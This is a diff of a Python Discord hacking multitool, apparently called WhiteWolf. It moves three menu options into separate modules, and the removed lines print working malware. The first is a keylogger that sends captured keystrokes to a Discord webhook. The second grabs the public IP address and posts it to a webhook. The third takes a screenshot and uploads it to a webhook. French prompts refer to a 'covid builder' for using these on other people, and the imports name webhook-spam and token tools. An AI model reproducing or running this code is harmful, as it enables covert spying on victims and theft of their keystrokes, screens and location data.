@@ -62,6 +62,9 @@ from code.nitro import nitro
 from code.webhookspaming import webhookspam
 from code.idtotoken import idtotoken
 from code.invitbot import invit
+from code.kylog import kylog
+from code.grabip import grabip
+from code.screener import screen
 
 def rpc():
     try:
@@ -365,129 +368,14 @@ while True:
             print(f"Error {e}")
         
         if covid == "1":
-            try:
-                os.system("cls")
-                webhook_choice = input(f"""{BLUE}
-
-                ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███  
-                ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
-                ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
-                ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
-                ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
-                ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
-                ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
-                ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
-                ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░     
-                ░                      ░        ░                                                  
-                            {BLUE}
-                Met ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder): """)
-            except ValueError as e:
-                print(f"Error {e}")
-
-            os.system("cls")
-
-            webhook = webhook_choice
-
-            buffer = ""
-            timer = None
-
-            def send_buffer():
-                global buffer
-
-                if buffer:
-                    data = {
-                        "content": buffer,
-                        "username": "WhiteWolf",
-                        "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
-                    }
-
-                    requests.post(webhook, json=data)
-                    buffer = ""
-
-            def reset_timer():
-                global timer
-                if timer:
-                    timer.cancel()
-
-                timer = threading.Timer(1.0, send_buffer)  
-                timer.start()
-
-            def on_press(key):
-                global buffer
-
-                try:
-                    char = key.char
-                    buffer += char
-
-                except AttributeError:
-                    if key == keyboard.Key.space:
-                        buffer += " "
-                    elif key == keyboard.Key.enter:
-                        buffer += "\n"
-                reset_timer()
-
-            listener = keyboard.Listener(on_press=on_press)
-            listener.start()
-            listener.join()
+            kylog()
         
         elif covid == "2":
-            os.system("cls")
-            try:
-                ip_grabing = input("""
-                     ██████╗ ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██╗██████╗ 
-                    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     ██║██╔══██╗
-                    ██║  ███╗██████╔╝███████║██████╔╝██║██╔██╗ ██║██║  ███╗    ██║██████╔╝
-                    ██║   ██║██╔══██╗██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║    ██║██╔═══╝ 
-                    ╚██████╔╝██║  ██║██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝    ██║██║     
-                     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝╚═╝     
-                        
-                    Met Ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder) : """)
-            except ValueError as e:
-                print(f"Error {e}")
-                
-            webhook = ip_grabing
+            grabip()
 
-            try:
-                ip = requests.get("https://checkip.amazonaws.com").text.strip()
-             #  print(ip)
-                data = {
-                    "content": ip,
-                    "username": "WhiteWolf",
-                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
-                }
-                requests.post(webhook, json=data)
-            except ValueError:
-                print("Value error")
-                time.sleep(3)
         elif covid == "3":
-            os.system("cls")
-            try:
-                screen = input(""" {RED}
-                    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
-                    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
-                    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
-                    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
-                    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
-                    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
-                    Met Ton webhook discord (Pour tester sur des gens autre que vous allez sur le covid builder): """)
-            except ValueError as e:
-                print(f"Error {e}")
+            screen()
 
-            webhook = screen
-            with mss.MSS() as sct:
-                img = sct.grab(sct.monitors[1])
-
-                img_bytes = mss.tools.to_png(img.rgb, img.size)
-
-                files = {
-                    "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
-                }
-
-                requests.post(webhook, data={
-                "content": "screenshot", 
-                "username": "WhiteWolf", 
-                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
-                }, files=files)
         elif covid == "4":
             try:
                 os.system("cls")
